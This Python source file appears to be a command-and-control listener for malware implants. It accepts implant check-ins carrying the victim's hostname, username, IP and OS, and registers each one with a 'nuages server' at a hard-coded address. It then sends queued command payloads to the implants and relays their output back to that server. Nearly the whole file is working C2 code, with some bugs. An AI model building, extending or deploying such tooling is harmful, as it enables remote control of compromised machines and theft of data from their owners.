from socket import *
import re
import argparse
import threading
from Implant import *

parser = argparse.ArgumentParser()
parser.add_argument("-i",help="IP to listen on")
parser.add_argument("-p",help="Port to listen on")
parser.add_argument("-d",help="Debug mode", action="store_true")
parsed=parser.parse_args()

#ConfigVariables, TODO: Parse from file
config = {
	"MAX_CONN":96,
	"HOST":"0.0.0.0",
	"PORT":3000,
	"SOCK_KILL":"SOCKkILL109",
	"SERV_KILL":"SERVKILL102",
	"CONN_STR":"http://localhost:3000",
	"NUAGES":"http://192.168.1.218:3030"
}

DEBUG=False
if parsed.d:
	DEBUG=True

if parsed.p:
	config["PORT"] = int(parsed.p)

if parsed.i:
	config["HOST"] = parsed.i 

def debug(inp):
	if DEBUG:
		print("[D]{}".format(inp))

class SlaveHandler():
	def __init__(self,config):
		self.config = config
		self.kill = False
		self.bindings = [] #An array that contains implant objects

	def run(self):
		while not self.kill:
			s = socket(AF_INET, SOCK_STREAM)
			s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
			s.bind((self.config["HOST"],self.config["PORT"]))
			s.listen(self.config["MAX_CONN"])	
			conn, addr = s.accept()
			debug("Connection received from:{}".format(addr))
			threading.Thread(target=self.inputHandler, args=(conn,addr)).start()

	def die(self):
		debug("Killing")
		self.kill = True
			
	#Queries the bindings dict
	def getImplant(self,uid):
		if len(self.bindings) == 0:
			return False
		for binding in self.bindings:
			if binding.uid == uid:
				return binding
		return False

	def setBinding(self):
		pass
		
	def sendTask(self, conn, task):
		#CM^^COMMAND^^CAAAAAAAAAAAAAAAAAC^^
		payload = "CM^^"
		payload += task["payload"]
		payload += "^^"
		payload += task["id"]
		payload += "^^"
		debug("Sending payload: {}".format(payload))
		try:
			conn.sendall(payload)
			task["sent"] = True
			return True
		except Exception as e:
			debug("Failed: Err:::: {}".format(e))
			return False
			
	def getImplantByTaskId(self,taskId):
		for imp in self.bindings:
			if len(imp.tasks) > 0:
				for task in imp.tasks:
					if task["id"] == taskId:
						return imp
		return False
					
	#killus will kill just the connection
	#kill will kill the entire server
	def inputHandler(self, conn,addr):
		killus = False
		while not self.kill and not killus:
			try:
				data = conn.recv(1024)
			except Exception as e:
				pass
			if not data:
				return False
			debug("Data received:{}".format(data))
			inp = str(data)

			#Check for tasks before anything else:
			r = re.search("\|uid:\d\d\d\|",inp)
			if r:
				debug("Received UID")
				uid = r.group().replace("|","").replace("uid:","")
				imp = self.getImplant(uid)
				if imp:
					if len(imp.tasks) > 0:
						for task in imp.tasks:
							if task["sent"] == False:
								debug("TASK to PERFORM: {}".format(task["payload"]))
								self.sendTask(conn, task)
								return True


			#HANDLING #1
			#conditional handling:
			if self.config["SOCK_KILL"] in inp:
				debug("kill command received from: {}".format(addr))
				killus = True
				conn.close()
				return False

			#HANDLING #2
			#Dictates how new connections are handled
			if "INITSTR|" in inp:
				#teststr = "INITSTR|uid:392|hostname:theswamp|username:jakk|localIp:192.168.56.1|os:Win 8|FINSTR"
				#INITSTR|uid:392|hostname:theswamp|username:jakk|localIp:192.168.56.1|os:Win 8|FINSTR
				debug("initstr was found:{}".format(inp))
				#Create the implant object and create a binding with the output
				#Parse the UID from the initstr
				r = re.search("\|uid:\d\d\d\|",inp)
				if r:
					debug("Received UID")
					uid = r.group().replace("|","").replace("uid:","")
					imp = self.getImplant(uid)
					if imp:
						debug("Existing UID, will not create a new object")
						return False
					#The UID doesn't currently exist, we can create a new implant object for it
					if not imp:
						print("Config{}".format(config["CONN_STR"]))
						temp = Implant(config["NUAGES"],config["CONN_STR"], addr[0], uid)
						if temp.registerImplant(inp):
							#registration went well, add to bindings list
							self.bindings.append(temp)
							#Registration acknowledgement, so the client knows not to try again
							conn.sendall(b'RA')
						else:
							debug("couldn't register the implant with nuages server")
							conn.close()
							return False
					#Send rejection if uid is a duplicate
				else:
					debug("Received the INITSTR, but something went wrong")
					conn.close()
					return False

			#HANDLING #3
			#Handles the command results, to be send back to Nuages server
			#RSPid:zis1FqHdtWXtmIkR2hvOwZK0QnwkCV6K:rsp:COMMANDOUTPUT
			if "RSPid:" in inp:
				r = re.search("RSPid:[a-zA-Z0-9]{32}",inp)
				if r:
					debug("Received RSPid")
					taskId = r.group().replace("RSPid:","")
					imp = self.getImplantByTaskId(taskId)
					if imp:
						conn.close()
						imp.addResponse(inp, taskId)
				return True
				
			#nothing interesting to process
			else:
				try:
					debug("Sending back ping")
					conn.sendall(b'PING')
					r = re.search("\|uid:\d\d\d\|",inp)
					if r:
						uid = r.group().replace("|","").replace("uid:","")
						imp = self.getImplant(uid)
						debug("pingDebug: {} {}".format(uid,imp))
						imp.heartBeat()
				except Exception as e:
					debug("Can't ping, err: {}".format(e))
					conn.close()
					return False


if __name__ == "__main__":
	#debug mode on
	DEBUG=True
	debug("debugging enabled...")
	handler = SlaveHandler(config)
	handler.run()
